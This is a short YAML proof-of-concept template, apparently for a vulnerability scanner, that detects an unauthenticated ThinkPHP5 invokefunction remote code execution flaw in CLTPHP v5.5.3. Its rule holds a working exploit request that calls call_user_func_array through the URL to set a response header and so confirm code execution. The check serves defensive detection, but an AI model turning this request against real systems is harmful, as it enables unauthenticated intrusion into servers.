name: poc-yaml-cltphp-v5-thinkphp5-invoke-rce
binding: 063b2109-32c1-4269-972b-983693c8578f
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    vulnerability:
        id: CT-529748
        level: critical
    description: |
        cltphp v5.5.3  - Unauthenticated ThinkPHP5 Invoke RCE
transport: http
set:
    s1: randomLowercase(10)
    s2: randomLowercase(20)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /?s=home/\think\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]={{s1}}:{{s2}}
        expression: response.status == 200 && response.headers[s1] == s2
expression: r1()
